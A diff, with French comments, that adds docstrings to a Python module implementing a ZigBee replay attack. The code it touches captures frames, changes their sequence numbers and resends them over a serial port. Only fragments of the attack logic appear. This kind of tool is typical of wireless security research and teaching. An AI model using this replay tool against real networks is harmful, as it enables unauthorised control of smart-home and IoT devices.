@@ -1,3 +1,6 @@
+"""
+Ce Module implémente une attaque de replay sur le réseau ZigBee. Il permet de capturer des trames ZigBee, de les analyser, de les modifier et de les rejouer sur le réseau ZigBee. Il gère également les mécanismes de protection contre les attaques de type replay et permet de personnaliser la configuration de l' attaque.
+"""
 import sys
 import os
 import json
@@ -14,6 +17,7 @@ from CodeurTrame import CodeurTrameZigbee
 from DecodeurTrame import DecodeurTrameZigbee
 from sniff import SniffeurZigbee
 
+# Configuration du logger
 logging.basicConfig(
     level=logging.DEBUG,
     format='%(asctime)s - %(levelname)s - %(message)s',
@@ -25,6 +29,14 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 class ZigbeeReplayAttack:
+    """
+    @class ZigbeeReplayAttack
+    @brief Classe pour effectuer une attaque de replay sur le réseau ZigBee.
+    @details Cette classe permet de capturer des trames ZigBee, de les analyser, de les modifier (par exemple, en modifiant
+             les numéros de séquence) et de les rejouer sur le réseau ZigBee. Elle gère également les mécanismes de 
+             protection contre les attaques de type replay et permet de personnaliser la configuration de l'attaque.
+    """
+
     def __init__(
         self, 
         capture_file: str = 'captures_zigbee.json', 
@@ -33,13 +45,22 @@ class ZigbeeReplayAttack:
         serial_port: Optional[str] = None,
         aes_key: Optional[str] = None
     ):
+        """
+        @brief Constructeur de la classe ZigbeeReplayAttack.
+        
+        @param capture_file: Nom du fichier de capture pour stocker les trames ZigBee capturées.
+        @param channel: Canal ZigBee sur lequel l'attaque de replay sera effectuée.
+        @param pan_id: PAN ID du réseau ZigBee.
+        @param serial_port: Port série utilisé pour envoyer les trames de replay.
+        @param aes_key: Clé AES pour la sécurité des trames, si applicable.
+        """
         self.capture_file = capture_file
         self.channel = channel
         self.pan_id = pan_id
         self.serial_port = serial_port
         self.aes_key = aes_key
         
-        # Initialize helper classes
+        # Initialisation des classes auxiliaires
         self.codeur = CodeurTrameZigbee(logger)
         self.decodeur = DecodeurTrameZigbee(logger)
         self.sniffer = SniffeurZigbee(
@@ -57,7 +78,9 @@ class ZigbeeReplayAttack:
 
     def capturer_trames_live(self, duree_capture: int = 10):
         """
-        Capture live des trames ZigBee pendant une durée spécifiée
+        @brief Capture live des trames ZigBee pendant une durée spécifiée.
+        
+        @param duree_capture: Durée de la capture en secondes.
         """
         logger.info(f"Démarrage de la capture live pour {duree_capture} secondes")
         self.sniffer.demarrer_sniffer()
@@ -69,7 +92,7 @@ class ZigbeeReplayAttack:
 
     def charger_captures(self):
         """
-        Charger et analyser les captures Zigbee
+        @brief Charger et analyser les captures ZigBee à partir d'un fichier JSON.
         """
         try:
             with open(self.capture_file, 'r', encoding='utf-8') as f:
@@ -96,7 +119,7 @@ class ZigbeeReplayAttack:
 
     def _extraire_sequences(self):
         """
-        Extraire les numéros de séquence des trames capturées
+        @brief Extraire les numéros de séquence des trames capturées.
         """
         sequences = []
         for capture in self.captures:
@@ -113,7 +136,7 @@ class ZigbeeReplayAttack:
 
     def _generer_variations_sequence(self):
         """
-        Générer des variations de numéro de séquence
+        @brief Générer des variations de numéro de séquence basées sur la séquence de base.
         """
         if not self.sequence_base:
             return
@@ -130,7 +153,9 @@ class ZigbeeReplayAttack:
 
     def _generer_sequence_cryptographique(self) -> int:
         """
-        Générer un numéro de séquence cryptographiquement sûr
+        @brief Générer un numéro de séquence cryptographiquement sûr.
+        
+        @return: Numéro de séquence généré de manière cryptographique.
         """
         seed = hashlib.sha256(
             str(self.sequence_base).encode() + 
@@ -140,7 +165,11 @@ class ZigbeeReplayAttack:
 
     def preparer_trame_replay(self, trame_originale: dict) -> bytes:
         """
-        Prépare une trame pour le replay en utilisant le codeur
+        @brief Préparer une trame pour le replay en modifiant le numéro de séquence.
+        
+        @param trame_originale: Trame ZigBee originale à modifier.
+        
+        @return: Trame prête à être envoyée en replay sous forme de bytes.
         """
         sequence = random.choice(self.sequence_variations) if self.sequence_variations else random.randint(0, 255)
         
@@ -156,7 +185,9 @@ class ZigbeeReplayAttack:
 
     def preparer_trames_replay(self, nombre_trames: int = 20):
         """
-        Préparer les trames pour le replay
+        @brief Préparer plusieurs trames pour le replay.
+        
+        @param nombre_trames: Nombre de trames à préparer pour le replay.
         """
         self.replay_queue = queue.Queue()
         
@@ -170,7 +201,9 @@ class ZigbeeReplayAttack:
 
     def envoyer_trames_replay(self, nombre_replays: int = 5):
         """
-        Envoyer les trames de replay
+        @brief Envoyer les trames de replay via le port série.
+        
+        @param nombre_replays: Nombre de fois que chaque trame sera envoyée.
         """
         try:
             with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
@@ -200,7 +233,10 @@ class ZigbeeReplayAttack:
 
     def lancer_attaque_replay(self, nombre_replays: int = 5, capture_live: bool = False):
         """
-        Lancer l'attaque de replay complète
+        @brief Lancer l'attaque de replay complète avec capture et envoi des trames.
+        
+        @param nombre_replays: Nombre de fois que chaque trame sera envoyée.
+        @param capture_live: Si True, effectuer une capture live des trames ZigBee.
         """
         try:
             if capture_live:
@@ -226,6 +262,9 @@ class ZigbeeReplayAttack:
             logger.error(f"Échec de l'attaque de replay : {e}")
 
 def main():
+    """
+    @brief Fonction principale pour configurer et lancer l'attaque de replay ZigBee.
+    """
     # Configuration de l'attaque
     attaque = ZigbeeReplayAttack(
         capture_file='captures_zigbee.json',
